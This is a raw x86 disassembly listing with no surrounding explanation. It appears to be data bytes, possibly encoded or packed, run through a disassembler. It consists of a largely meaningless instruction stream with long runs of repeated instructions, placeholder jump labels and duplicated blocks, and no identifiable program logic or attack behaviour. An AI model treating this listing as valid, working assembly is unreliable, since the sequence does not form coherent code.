imul ebp [ eax + 0x68 ] 0xffffff98
and ah dl
mov esi ecx
adc dl [ edi - 0x68 ]
adc ebx [ edi + 0x1c686875 ]
outsd
xchg esp eax
insb
cwde
adc ebp [ ecx + 0x76 ]
push 0xb3eb1468
mov edx [ esi - 0x5b76ed68 ]
xchg edi eax
xchg edi eax
adc al 0xeb
mov bl 0x83
xchg esi eax
cwde
adc al [ ecx + 0x7e686878 ]
xchg edx eax
mov esp 0x7079797
pop es
pop es
pop es
sbb dl bl
mov bl 0xdb
jle r-xdata
lahf
std
xchg edi eax
jl r-xdata
pop es
pop es
pop es
pop es
jg r-xdata
mov eax 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
les edx [ esi + edx * 2 ]
jg r-xdata
jno r-xdata
adc [ edi + 0x7070797 ] 0x60
push 0x4b5a7ece
push 0x121a0707
out dx eax
push 0x68
push 0x667ec7c4
nop
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
pop esp
push 0xa57ece68
xchg edx eax
xchg edi eax
xchg edi eax
sbb al 0xd2
sar [ esi - 0x74 ] 0x71
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push edi
adc [ eax ] dh
mov eax [ 0xffffffff97a9c77e ]
xchg edi eax
pop es
pop es
push 0xcf7e6868
jle r-xdata
push 0x97fd0707
xchg edi eax
jle r-xdata
mov bh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
xchg esp eax
xchg edi eax
xchg edi eax
jg r-xdata
lodsd [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
stosd [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl dl
jle r-xdata
jge r-xdata
jle r-xdata
dec ebx
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x7b1c
adc [ edi + 0x4b807e97 ] 0x7076868
pop es
push 0x7070768
pop es
pop es
int1
scasb [ edi ]
lahf
jle r-xdata
pop edx
dec ebx
jo r-xdata
dec edi
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop esi
push esp
rol ecx 0x7e
inc esp
stosd [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
call [ ebx + 0x1a979796 ]
adc dl [ ebx ]
insb
push 0x867d7e68
xchg edi eax
xchg edi eax
pop es
std
int1
int1
push ds
shr [ edi - 0x31 ] cl
std
mov ecx 0x6dd21ef1
jle r-xdata
push 0x7070707
cmpsb [ esi ] [ edi ]
jle r-xdata
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
xchg edi eax
xchg edi eax
rcl [ edi + 0x7070797 ] cl
pop es
pop es
pop es
pop es
pop es
into
sbb al 0x6f
push ds
fidivr [ edi ]
jle r-xdata
popfd
xchg edi eax
xchg edi eax
push ss
jpo r-xdata
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
jle r-xdata
jg r-xdata
inc edi
inc edi
push 0xa67f0768
jo r-xdata
pop es
pop es
pop es
jle r-xdata
jl r-xdata
mov bl 0xa9
xchg edi eax
xchg edi eax
int1
push ds
ror [ edi - 0x31 ] cl
jle r-xdata
sahf
xchg edi eax
xchg edi eax
jle r-xdata
scasb [ edi ]
in al dx
mov edi 0x83de1298
xchg edi eax
xchg edi eax
jle r-xdata
rcl [ edi + 0x50070797 ] 0x1
push 0x7070707
pop es
mov al [ 0xffffffffcf079797 ]
std
int1
push ds
sar [ edi - 0x31 ] cl
std
stc
jle r-xdata
push 0x7070707
pop es
pop es
jg r-xdata
add [ edi ] edx
push 0x7070707
int 0xf1
push ds
retn 0xfdf3
fist [ edi - 0x63813e69 ]
push 0x7e571268
mov ah 0xaf
xchg edi eax
xchg edi eax
jle r-xdata
mov ah 0x97
xchg edi eax
pop es
pop es
pop es
cwde
adc cl dh
adc [ edi + 0x47647e97 ] 0x68
push 0x47a67f07
cmpsb [ esi ] [ edi ]
xchg edi eax
xchg edi eax
arpl [ eax + 0x68 ] bp
cwde
adc bl dh
adc [ edi - 0x5f078169 ] 0xffffff97
xchg edi eax
pop es
iretd
shl [ edi - 0xa ] cl
loope r-xdata
xchg edi eax
pop es
pop es
push eax
push eax
shl [ ebx - 0x19 ] cl
pop es
sbb bh bl
mov bl 0x1b
jle r-xdata
inc eax
push 0x9bcaae68
cwde
adc ebx [ edi ]
mov [ 0x187e9797 ] al
arpl [ eax + 0x68 ] bp
pop es
pop es
pop es
pop es
pop es
pop es
test al 0x97
xchg edi eax
adc al 0x6f
xchg esi eax
cwde
adc ebp [ ecx + edx * 8 + 0x57a49797 ]
push ds
shl [ ebx - 0x4c2ce171 ] cl
mov ebp [ esi + 0x11988fd4 ]
dec ebx
jns r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
push ds
adc [ edi - 0x69 ] edx
xchg edi eax
xchg edi eax
jle r-xdata
xchg edi eax
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
inc [ edi - 0x6a ]
xchg esi eax
xchg edi eax
movsb [ edi ] [ esi ]
dec esp
les ebp [ eax + 0x1 ]
pop ss
mov esp 0xc9079797
int3
or al 0xa2
xchg edi eax
xchg edi eax
pop es
int1
push ds
fisub [ ebx + 0x7e ]
inc esp
mov dh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
xchg [ edi - 0x81f869 ] edx
jpe r-xdata
jle r-xdata
pop es
adc al 0xea
imul edx [ eax + ebx * 4 - 0x686373eb ] 0xffffff97
push 0x68
push 0x7070707
pop es
rcr [ edx ] 0x1a
sbb ebp [ edx + 0x68 ]
push 0x97bf897e
xchg edi eax
pop es
pop es
push 0x97abbe7e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jg r-xdata
pop es
pop es
pop es
push 0x7070707
pop es
pop es
pop es
jg r-xdata
jle r-xdata
pop es
adc al 0xf2
imul edx [ edi - 0x6864c782 ] 0xffffff97
pop es
sbb al 0x4d
push 0x6bd21c68
jle r-xdata
inc ebx
jle r-xdata
push 0xff6868
test [ esi + 0x747ec029 ] dh
xchg ebx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
pop es
dec ebp
push 0x754c968
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
loope r-xdata
shl [ ecx + 0x7e ] cl
jge r-xdata
popfd
xchg edi eax
xchg edi eax
sbb al 0x6f
jle r-xdata
jns r-xdata
jle r-xdata
push ss
inc edx
push 0x7070768
pop es
std
in al 0x7e
call 0x7b14d32
pop es
sbb bl dl
inc ebx
sbb dl dl
push ebx
jle r-xdata
int1
push ds
push 0xd47e0707
dec ecx
push 0x7070768
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
movsb [ edi ] [ esi ]
inc ebp
push ds
shr [ ebx + 0x1c ] cl
fisubr [ ebx + 0x1c ]
jmp r-xdata
cwde
adc ch ah
inc eax
push 0x40f87e68
push 0x97fd0768
jle r-xdata
inc eax
push 0x97976300
push 0x7a139868
dec ebp
push 0xa5697e07
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jle r-xdata
xchg edi eax
jle r-xdata
add [ ebx - 0x69 ] ah
xchg edi eax
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp [ edi ]
adc [ edi - 0x73be8169 ] 0xffffff97
xchg edi eax
push 0x7ec8c7c0
xchg edx eax
mov bh 0x97
xchg edi eax
xlat
jle r-xdata
push 0xd7ef7e68
xchg edi eax
xchg edi eax
pop ebx
push 0x7070768
int1
push ds
0x7e33
cmp [ ebx + 0x1c079797 ] bl
dec ebp
jae r-xdata
lea esp [ ebx + 0x7079797 ]
aam 0x97
xchg edi eax
std
in al 0x7e
adc [ eax + ebp * 2 + 0x68 ] bl
pop es
int1
push ds
sar [ ebp - 0x31 ] cl
std
jecxz r-xdata
pop es
pop es
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x56
int1
push ds
rol [ ebx - 0x31 ] cl
std
in al 0x7e
sbb eax [ ebx + 0x68 ]
push 0x1ef1eefd
rol [ ebx + 0x7e ] cl
adc [ ebp + 0x1ef19797 ] ebx
push 0x7070707
pop es
pop es
sar [ esi - 0x20 ] 0x5c
push 0x9f97ff68
xchg edi eax
xchg edi eax
jle r-xdata
0x7079797 0x707
pop es
pop es
pop es
pop es
jle r-xdata
pop es
adc dl [ edi - 0x68 ]
adc edx [ ebx - 0x38686869 ]
push 0xec149fc1
xlat
xchg edi eax
jle r-xdata
pop esi
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
rol bh 0x7f
cmp al 0x97
xchg edi eax
xchg edi eax
adc al 0x53
fwait
jle r-xdata
dec edx
push 0x6f14ce68
pop eax
push 0x7070768
pop es
scasb [ edi ]
0x7e9b
xchg edi eax
xchg edi eax
jg r-xdata
pop es
pop es
pop es
int1
push ds
retn 0x7eb9
jbe r-xdata
pop es
std
xchg ebx eax
call [ edi + 0x7e9797a7 ]
sets [ edi + 0x20680797 ]
pop ebx
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
mov [ 0x7079797 ] eax
mov ah [ ebx + 0x68 ]
push 0x4ea91398
push 0x7e93fd68
jbe r-xdata
mov eax 0x7079797
pop es
pop es
xchg ebp eax
jle r-xdata
adc al 0x6f
stosd [ edi ]
xchg edi eax
xchg edi eax
sbb al 0x6f
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb al 0x46
jle r-xdata
push 0x7070707
pop es
push 0x7070768
pop es
xchg [ edi + edx * 4 + 0x7070797 ] eax
pop es
outsd
push 0x237ec268
lea edx [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
rol eax 0xc5
sub [ eax ] esi
push ecx
xchg ebx eax
jle r-xdata
xlat
xchg edi eax
xchg edi eax
jle r-xdata
pop es
push ss
scasd [ edi ]
popfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
adc [ edi - 0x69 ] ebx
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97971b01
xchg edi eax
jle r-xdata
fwait
xchg edi eax
xchg edi eax
pop es
pop es
adc dl [ edi - 0x68 ]
adc ebx [ ebx ]
outsd
push 0x41387e68
push 0xc47ec068
salc
xchg edi eax
xchg edi eax
pop es
pop es
pop es
sbb dl bl
mov bl 0xaf
xchg edi eax
imul ebp [ eax + 0x68 ] 0x16
sub [ ebx ] ebp
xchg edi eax
xchg edi eax
xchg edi eax
arpl [ esi + 0x1b989797 ] dx
push esi
mov eax 0x437e9797
sbb al 0xca
imul ebx [ esp + ecx * 4 ] 0xffffff94
inc esi
jle r-xdata
je r-xdata
pop es
jle r-xdata
pop es
pop es
pop es
pop es
arpl [ eax + 0x68 ] bp
cwde
adc ebp [ ecx - 0x29797b2 ]
xchg [ edi + 0x7e97fd97 ] dl
sub [ ebx + 0x7079797 ] al
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
push 0x5ea4f3c7
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
mov ebx 0x7079797
int1
push ds
rol [ ebx + 0x1c ] cl
push esi
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
scasb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
pop es
jle r-xdata
into
push 0x7070707
inc eax
push 0x752b7e68
push 0x7070768
pop es
pop es
jle r-xdata
movsb [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sbb bl [ edx ]
pop edi
push 0x68
push 0x9787947e
pop es
pop es
mov ss [ edi + 0x7070797 ]
xchg edi eax
jle r-xdata
aam 0x97
xchg edi eax
pop es
pop es
jle r-xdata
pop es
pop es
pop es
call [ ebx + 0x7e979796 ]
arpl [ edx + 0x68 ] bx
push 0x20980707
push edi
mov ebp 0x7079797
pop es
scasd [ edi ]
xchg edi eax
xchg edi eax
pop es
jle r-xdata
jle r-xdata
mov [ 0x7079797 ] al
pop es
pop es
pop es
jle r-xdata
std
xchg edi eax
sar [ esi + 0x36 ] 0x92
xchg edi eax
xchg edi eax
adc [ edi + 0x7070797 ] 0x1a
sbb bl [ edi + 0x6a ]
push 0x87947e68
xchg edi eax
sub_48e28f
int1
push ds
fidivr [ edi ]
jle r-xdata
pop es
pop es
pop es
jle r-xdata
jl r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc [ edi + 0x4b807e97 ] 0x7076868
pop es
pop es
pop es
retn 0x7b1c
add [ edi ] edx
push 0x7070707
int 0xf1
push ds
retn 0xfdf3
xchg edi eax
xchg edi eax
xchg edi eax
push ds
adc [ edi - 0x69 ] edx
xchg edi eax
xchg edi eax
jle r-xdata
xchg edi eax
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
inc [ edi - 0x6a ]
xchg esi eax
xchg edi eax
movsb [ edi ] [ esi ]
dec esp
les ebp [ eax + 0x1 ]
pop ss
mov esp 0xc9079797
int3
sub_48e2ef
std
xchg ebx eax
call [ edi - 0x686859 ]
inc edi
xchg esi eax
xchg esi eax
xchg edi eax
movsb [ edi ] [ esi ]
dec esp
les ebp [ eax + 0x1 ]
pop ss
xchg edi eax
xchg edi eax
xchg edi eax
push ds
adc [ edi - 0x69 ] edx
xchg edi eax
xchg edi eax
jle r-xdata
xchg edi eax
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
inc [ edi - 0x6a ]
mov esp 0xc9079797
int3
sub_48e474
pop ebp
push 0x697e0768
movsd [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jle r-xdata
cmp [ ebx + 0x1c079797 ] bl
dec ebp
jae r-xdata
int1
push ds
0x7e33
pop es
pop es
pop es
push 0x7070707
pop es
adc al 0xf2
imul edx [ edi - 0x6864c782 ] 0xffffff97
pop es
sbb al 0x4d
push 0x6bd21c68
jle r-xdata
pop es
pop es
pop es
pop es
sbb al 0x56
int1
push ds
rol [ ebx - 0x31 ] cl
std
in al 0x7e
sbb eax [ ebx + 0x68 ]
push 0x1ef1eefd
rol [ ebx + 0x7e ] cl
adc [ ebp + 0x1ef19797 ] ebx
shl [ ecx + 0x7e ] cl
jge r-xdata
pop es
pop es
pop es
pop es
dec ebp
push 0x754c968
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
loope r-xdata
jle r-xdata
push ss
inc edx
push 0x7070768
pop es
std
in al 0x7e
call 0x7b14d32
pop es
sbb bl dl
inc ebx
sbb dl dl
push ebx
jle r-xdata
cwde
adc ch ah
inc eax
push 0x40f87e68
push 0x97fd0768
jle r-xdata
inc eax
push 0x97976300
push 0x7a139868
dec ebp
xchg edi eax
jle r-xdata
add [ ebx - 0x69 ] ah
xchg edi eax
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp [ edi ]
adc [ edi - 0x73be8169 ] 0xffffff97
xchg edi eax
push 0x7ec8c7c0
xchg edx eax
mov bh 0x97
xchg edi eax
xlat
jle r-xdata
push 0xd7ef7e68
xchg edi eax
xchg edi eax
pop ebx
push 0x7070768
lea esp [ ebx + 0x7079797 ]
aam 0x97
xchg edi eax
std
in al 0x7e
adc [ eax + ebp * 2 + 0x68 ] bl
pop es
int1
push ds
sar [ ebp - 0x31 ] cl
std
jecxz r-xdata
pop es
pop es
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sar [ esi - 0x20 ] 0x5c
push 0x9f97ff68
xchg edi eax
xchg edi eax
jle r-xdata
0x7079797 0x707
pop es
pop es
pop es
pop es
jle r-xdata
pop es
adc dl [ edi - 0x68 ]
adc edx [ ebx - 0x38686869 ]
push 0xec149fc1
xlat
xchg edi eax
jle r-xdata
pop esi
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
rol bh 0x7f
cmp al 0x97
xchg edi eax
xchg edi eax
adc al 0x53
fwait
jle r-xdata
dec edx
push 0x6f14ce68
pop eax
push 0x7070768
pop es
scasb [ edi ]
0x7e9b
xchg edi eax
xchg edi eax
jg r-xdata
pop es
pop es
pop es
int1
push ds
retn 0x7eb9
jbe r-xdata
pop es
std
xchg ebx eax
call [ edi + 0x7e9797a7 ]
sets [ edi + 0x20680797 ]
pop ebx
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
mov [ 0x7079797 ] eax
mov ah [ ebx + 0x68 ]
push 0x4ea91398
push 0x7e93fd68
jbe r-xdata
mov eax 0x7079797
pop es
pop es
xchg ebp eax
jle r-xdata
adc al 0x6f
stosd [ edi ]
xchg edi eax
xchg edi eax
sbb al 0x6f
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb al 0x46
jle r-xdata
push 0x7070707
pop es
push 0x7070768
pop es
xchg [ edi + edx * 4 + 0x7070797 ] eax
pop es
outsd
push 0x237ec268
lea edx [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
rol eax 0xc5
sub [ eax ] esi
push ecx
xchg ebx eax
jle r-xdata
xlat
xchg edi eax
xchg edi eax
jle r-xdata
pop es
push ss
scasd [ edi ]
popfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
adc [ edi - 0x69 ] ebx
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97971b01
xchg edi eax
jle r-xdata
fwait
xchg edi eax
xchg edi eax
pop es
pop es
adc dl [ edi - 0x68 ]
adc ebx [ ebx ]
outsd
push 0x41387e68
push 0xc47ec068
salc
xchg edi eax
xchg edi eax
pop es
pop es
pop es
sbb dl bl
mov bl 0xaf
xchg edi eax
imul ebp [ eax + 0x68 ] 0x16
sub [ ebx ] ebp
xchg edi eax
xchg edi eax
xchg edi eax
arpl [ esi + 0x1b989797 ] dx
push esi
mov eax 0x437e9797
sbb al 0xca
imul ebx [ esp + ecx * 4 ] 0xffffff94
inc esi
jle r-xdata
je r-xdata
pop es
jle r-xdata
pop es
pop es
pop es
pop es
arpl [ eax + 0x68 ] bp
cwde
adc ebp [ ecx - 0x29797b2 ]
xchg [ edi + 0x7e97fd97 ] dl
sub [ ebx + 0x7079797 ] al
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
push 0x5ea4f3c7
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
mov ebx 0x7079797
int1
push ds
rol [ ebx + 0x1c ] cl
push esi
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
scasb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
pop es
jle r-xdata
into
push 0x7070707
inc eax
push 0x752b7e68
push 0x7070768
pop es
pop es
jle r-xdata
movsb [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sbb bl [ edx ]
pop edi
push 0x68
push 0x9787947e
pop es
pop es
mov ss [ edi + 0x7070797 ]
xchg edi eax
jle r-xdata
aam 0x97
xchg edi eax
pop es
pop es
jle r-xdata
pop es
pop es
pop es
call [ ebx + 0x7e979796 ]
arpl [ edx + 0x68 ] bx
push 0x20980707
push edi
mov ebp 0x7079797
pop es
scasd [ edi ]
xchg edi eax
xchg edi eax
pop es
jle r-xdata
jle r-xdata
mov [ 0x7079797 ] al
pop es
pop es
pop es
jle r-xdata
std
xchg edi eax
sar [ esi + 0x36 ] 0x92
xchg edi eax
xchg edi eax
adc [ edi + 0x7070797 ] 0x1a
sbb bl [ edi + 0x6a ]
push 0x87947e68
xchg edi eax
sub_48e5ca
mov ch 0x9b
xchg edi eax
xchg edi eax
xchg esp eax
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int 0x7e
xchg esp eax
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
int1
push ds
retn 0x7eb9
jns r-xdata
push 0x8d237ec2
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
rol eax 0xc5
sub [ eax ] esi
push ecx
push 0xe260561c
xchg [ esi + 0x35 ] edi
arpl [ eax + 0x68 ] bp
pop es
pop es
pop es
pop es
sar [ esi - 0x20 ] 0x5c
push 0x9f97ff68
xchg edi eax
xchg edi eax
jle r-xdata
dec edx
push 0x6f14ce68
xchg ebp eax
jle r-xdata
pop eax
push 0x7070768
pop es
scasb [ edi ]
0x7e9b
mov ah [ ebx + 0x68 ]
push 0x4ea91398
push 0x7e93fd68
jbe r-xdata
mov eax 0x7079797
pop es
pop es
pop es
push ss
scasd [ edi ]
pop es
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97971b01
xchg edi eax
jle r-xdata
fwait
xchg edi eax
xchg edi eax
pop es
pop es
adc dl [ edi - 0x68 ]
adc ebx [ ebx ]
outsd
push 0x41387e68
push 0xc47ec068
salc
xchg edi eax
xchg edi eax
pop es
pop es
pop es
sbb dl bl
mov bl 0xaf
xchg edi eax
imul ebp [ eax + 0x68 ] 0x16
sub [ ebx ] ebp
xchg edi eax
xchg edi eax
xchg edi eax
arpl [ esi + 0x1b989797 ] dx
push esi
mov eax 0x437e9797
xchg [ edi + 0x7e97fd97 ] dl
sub [ ebx + 0x7079797 ] al
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
push 0x5ea4f3c7
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
mov ebx 0x7079797
int1
push ds
rol [ ebx + 0x1c ] cl
push esi
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
scasb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
inc eax
push 0x752b7e68
push 0x7070768
pop es
pop es
jle r-xdata
movsb [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sbb bl [ edx ]
pop edi
push 0x68
push 0x9787947e
pop es
pop es
mov ss [ edi + 0x7070797 ]
xchg edi eax
jle r-xdata
aam 0x97
xchg edi eax
pop es
pop es
jle r-xdata
pop es
pop es
pop es
call [ ebx + 0x7e979796 ]
arpl [ edx + 0x68 ] bx
push 0x20980707
push edi
mov ebp 0x7079797
pop es
scasd [ edi ]
xchg edi eax
xchg edi eax
pop es
jle r-xdata
jle r-xdata
mov [ 0x7079797 ] al
pop es
pop es
pop es
jle r-xdata
std
xchg ebx eax
jle r-xdata
xchg edi eax
sar [ esi + 0x36 ] 0x92
xchg edi eax
xchg edi eax
adc [ edi + 0x7070797 ] 0x1a
sbb bl [ edi + 0x6a ]
push 0x87947e68
xchg edi eax
sbb al 0xca
imul ebx [ esp + ecx * 4 ] 0xffffff94
inc esi
jle r-xdata
je r-xdata
pop es
jle r-xdata
into
push 0x7070707
sub_48e856
push 0xd21ef1cf
outsd
jle r-xdata
cmp edx [ edi + 0x537e9797 ]
xchg [ edi + 0x16070797 ] dl
jpo r-xdata
adc [ edi + 0x7070797 ] 0x7
dec ebx
push 0x7070768
pop es
pop es
pop es
pop es
scasb [ edi ]
shl [ ebx + 0x7e ] cl
shl [ edi + 0x68 ] 0x1
push 0x7ec10707
sub [ edi + 0x7079797 ] ebp
xchg ebp eax
xchg edi eax
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
leave
int3
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
push 0x545ecc68
pop es
pop es
pop es
pop es
pop es
pop es
adc al 0x53
mov bh 0x7e
xor ah [ edx + 0x68 ]
push 0x7070707
jle r-xdata
int1
push ds
fwait
cmp [ esi - 0x57 ] 0x768687a
push ds
rcr [ edi + 0x686d6e7f ] 0x1
push 0xa85b6fff
faddp st0
push ds
rcl [ ebx + 0x686d7c7f ] 0x1
push 0x686f907e
push 0xfdcd0707
cmpsb [ esi ] [ edi ]
jle r-xdata
pop es
pop es
std
out dx eax
jle r-xdata
bound ebp [ eax + 0x68 ]
pop es
pop es
pop es
pop es
r-xdata
lea edx [ edi + 0x786d7e97 ]
push 0x7070768
jge r-xdata
push 0x687b067e
push 0x5ff61298
push 0x4bd21a68
lodsb [ esi ]
push eax
cwde
adc edi [ esi ]
js r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pushad
dec edi
mov [ edi + 0x7e ] ss
lodsd [ esi ]
popad
push 0xda1ef168
sub esi ecx
push ds
ficom [ ebp - 0x32 ]
std
loop r-xdata
std
jecxz r-xdata
int1
push ds
ficom [ ebx + 0x7e ]
dec edi
pop edi
push 0xbbc06868
jle r-xdata
push ds
shl [ ebx - 0x31 ] cl
jle r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
salc
xchg edi eax
xchg edi eax
jg r-xdata
push ds
fisubr [ ecx ]
sahf
xchg edi eax
xchg edi eax
pop es
jg r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
mov ss [ edi + 0x5c7e0797 ]
js r-xdata
push 0x7070768
pop es
pop es
push eax
shr [ ebx - 0x69 ] cl
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
push 0xf1070707
push ds
fidivr [ edi - 0x32 ]
std
into
imul ebp [ eax + 0x68 ] 0x7e
jpo r-xdata
push cs
push 0x68423e7e
push 0x7070707
pop es
pop es
std
cli
jle r-xdata
rcr [ edx + 0x68 ] cl
push 0x8a66ffc4
into
push ds
shl [ ebx - 0x67ab5375 ] cl
adc edx edx
pop edx
push 0x66ffc468
mov bh dh
xlat
push 0x97975321
xchg edi eax
sbb al 0x69
jg r-xdata
push 0x7070768
pop es
jg r-xdata
pop es
int1
push ds
shl [ edi - 0x68500782 ] cl
xchg edi eax
jle r-xdata
mov cl 0x97
xchg edi eax
xchg [ edi + 0x627f0797 ] edx
dec ebx
push 0x5712ce68
cwde
adc eax [ esp + edi * 4 ]
xchg edi eax
xchg edi eax
les ebp [ eax + 0x1 ]
cmp edx [ edi - 0x7c816869 ]
inc ebx
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x6e
bound ecx [ ebx + 0x68 ]
push 0x985712ce
mov esp 0xa67e9797
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0x46
jle r-xdata
int1
mov [ 0xffffffff9d7e9797 ] al
pop edi
iretd
movsb [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
adc dl [ edi - 0x68 ]
push ds
mov eax [ 0x527e9797 ]
jpe r-xdata
pop es
jg r-xdata
stosb [ edi ]
xchg edi eax
sbb dl [ edx ]
pop edi
push 0x68
push 0x79e67ec7
push 0xcd070768
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
xchg edi eax
pop es
pop es
jle r-xdata
mov edi 0xc0079797
jg r-xdata
xchg edi eax
xchg edi eax
push ds
shr [ ebx + 0x12 ] cl
push edi
jle r-xdata
push 0xb7fdcd07
jle r-xdata
jle r-xdata
insb
mov bh 0x7e
jae r-xdata
push 0x4ab77e68
push 0x98e97e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
cwde
adc eax edx
xchg [ edi - 0x44768169 ] edx
xchg edi eax
xchg edi eax
pop es
pop es
int1
push ds
retn 0x7e4f
cmpsb [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
adc al 0x68
mov edx 0xf97eccc8
test [ edi + 0x7f070797 ] edx
in eax 0x6c
leave
int3
mov ah 0x97
xchg edi eax
cld
dec esp
xchg edx eax
push ecx
xchg ebx eax
movsb [ edi ] [ esi ]
push 0x98070707
salc
xchg edi eax
xchg edi eax
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
mov edx 0x7686855
pop es
jle r-xdata
cdq
xchg edi eax
xchg edi eax
pop es
pop es
pop es
mov esp 0x64497e50
push 0x7070768
pop es
pop es
pop es
adc al 0x53
fwait
jle r-xdata
popad
sbb ebp [ ebx + 0x7e9797a7 ]
add eax 0xc9686849
int3
pop ecx
pop es
pop es
pop es
push 0x7070768
cwde
push ebp
push 0x7e070768
pop ecx
sub_48ec20
push eax
shr [ ebx - 0x6a ] cl
xchg edi eax
xchg edi eax
xchg edi eax
std
cmpsd [ esi ] [ edi ]
jle r-xdata
loop r-xdata
inc ebp
push 0x66d25068
std
pop es
pop es
pop es
cwde
and cl dl
xchg ecx eax
push 0x337e63d2
jns r-xdata
push 0x4f1cafc1
adc al 0x6c
push 0x978ec07e
xchg edi eax
pop es
pop es
pop es
pop es
push ds
shr [ edi + 0x686faf7f ] 0x1
push 0x54b9eeff
ror [ ebx + 0x6842e07e ] 0x68
cwde
adc ebp ebp
mov cl 0x97
xchg edi eax
add edi [ esi - 0x47 ]
adc [ edi - 0x53f8f869 ] 0x49
cwde
sbb ecx [ edi ]
jpe r-xdata
scasd [ edi ]
outsd
push 0xb9eeff68
push 0xa97ec4c7
jns r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sar [ esi - 0x67 ] 0xba
xchg edi eax
xchg edi eax
pop es
pop es
